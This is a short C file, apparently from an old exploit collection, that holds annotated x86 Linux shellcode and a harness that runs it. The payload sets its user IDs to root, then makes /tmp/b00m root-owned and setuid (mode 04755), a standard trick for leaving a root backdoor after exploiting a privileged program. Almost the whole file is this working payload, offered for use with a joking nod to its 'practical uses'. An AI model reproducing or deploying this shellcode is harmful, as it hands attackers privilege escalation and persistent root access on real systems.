#include <stdio.h>
#include <stdlib.h>

char shellc[] = 

/* 
 *  setresuid(0, 0, 0); 
 *  chown("/tmp/b00m", 0, 0); 
 *  chmod("/tmp/b00m", 04755); 
 *  exit(x); 
 *
 *  yes, this has a couple of practical uses ;)
 *
 *  -- anathema@hack.co.za (September 2000)
 */

/* main: */
/* setresuid(0, 0, 0); */
"\x29\xc0"                                /* subl %eax, %eax          */
"\x29\xdb"                                /* subl %ebx, %ebx          */
"\x29\xc9"                                /* subl %ecx, %ecx          */
"\x29\xd2"                                /* subl %edx, %edx          */
"\xb0\xa4"                                /* movb $0xa4, %al          */
"\xcd\x80"                                /* int $0x80                */

"\xeb\x20"                                /* jmp callz                */

/* start: */
"\x5e"                                    /* popl %esi                */

/* chown("/tmp/b00m", 0, 0); */
"\x29\xc0"                                /* subl %eax, %eax          */
"\xb0\xb6"                                /* movb $182, %al           */
"\x89\xf3"                                /* movl %esi, %ebx          */
"\x29\xc9"                                /* subl %ecx, %ecx          */
"\x29\xd2"                                /* subl %edx, %edx          */
"\xcd\x80"                                /* int $0x80                */

/* chmod("/tmp/b00m", 04755); */
"\x29\xc0"                                /* subl %eax, %eax          */
"\xb0\x0f"                                /* movb $15, %al            */
"\x87\xf3"                                /* xchgl %esi, %ebx         */
"\x29\xc9"                                /* subl %ecx, %ecx          */
"\x66\xb9\xed\x09"                        /* movw $04755, %cx         */
"\xcd\x80"                                /* int $0x80                */

/* exit(x); */
"\x29\xc0"                                /* subl %eax, %eax          */
"\x40"                                    /* incl %eax                */
"\xcd\x80"                                /* int $0x80                */

/* callz: */
"\xe8\xdb\xff\xff\xff"                    /* call start               */
"/tmp/b00m"
;

main ()
{
    void (*sc)() = (void *)shellc;
    sc();
}

/* EOF */